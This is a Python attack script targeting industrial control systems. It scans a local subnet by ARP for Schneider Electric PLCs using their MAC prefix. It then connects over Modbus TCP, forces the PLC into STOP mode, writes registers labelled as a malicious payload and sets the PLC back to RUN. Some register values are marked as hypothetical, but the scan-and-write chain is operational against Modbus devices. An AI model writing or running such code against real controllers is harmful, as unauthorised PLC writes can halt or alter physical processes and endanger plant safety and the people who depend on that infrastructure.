from scapy.all import ARP, Ether, srp
from pyModbusTCP.client import ModbusClient
import time

# Network parameters
PLC_MAC_PREFIX = "00:80:F4"  # Common prefix of Schneider devices
SUBNET = "192.168.1.0/24"     # Modify this for your network

def find_plc_ip():
    """
    Scans the local network to find the Schneider Electric PLC
    by identifying MAC addresses starting with Schneider's prefix.
    """
    print("[*] Scanning network for Schneider Electric PLC...")
    arp_request = ARP(pdst=SUBNET)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request
    result = srp(packet, timeout=2, verbose=False)[0]
    
    for sent, received in result:
        if received.hwsrc.upper().startswith(PLC_MAC_PREFIX):
            print(f"[+] Schneider Electric PLC found at IP: {received.psrc}")
            return received.psrc
    print("[-] No Schneider Electric PLC found on the network.")
    return None

def download_program(plc_ip):
    """
    Connect to the PLC and download a new program to alter control tasks.
    """
    client = ModbusClient(host=plc_ip, port=502, unit_id=1, auto_open=True)

    if not client.open():
        print(f"[-] Unable to connect to PLC at {plc_ip}")
        return

    print(f"[+] Connected to PLC at {plc_ip}, initiating program download...")

    # Put PLC in STOP mode before full program download (if required)
    client.write_single_register(0x0800, 0x0002)  # Example: Change PLC to STOP mode
    time.sleep(2)

    # Example malicious program instructions: Modify a control register (dangerous!)
    # Writing new ladder logic or machine instructions would require vendor-specific tools/API.
    MALICIOUS_PAYLOAD = [1234, 5678, 9101, 1121]  # Hypothetical new program registers

    success = client.write_multiple_registers(0x1000, MALICIOUS_PAYLOAD)

    if success:
        print("[+] Malicious program downloaded successfully!")
    else:
        print("[-] Program download failed.")

    # Restart PLC
    client.write_single_register(0x0800, 0x0001)  # Example: Set PLC back to RUN mode
    print("[*] PLC set back to run mode.")

    client.close()

# Main execution
if __name__ == "__main__":
    plc_ip = find_plc_ip()
    if plc_ip:
        download_program(plc_ip)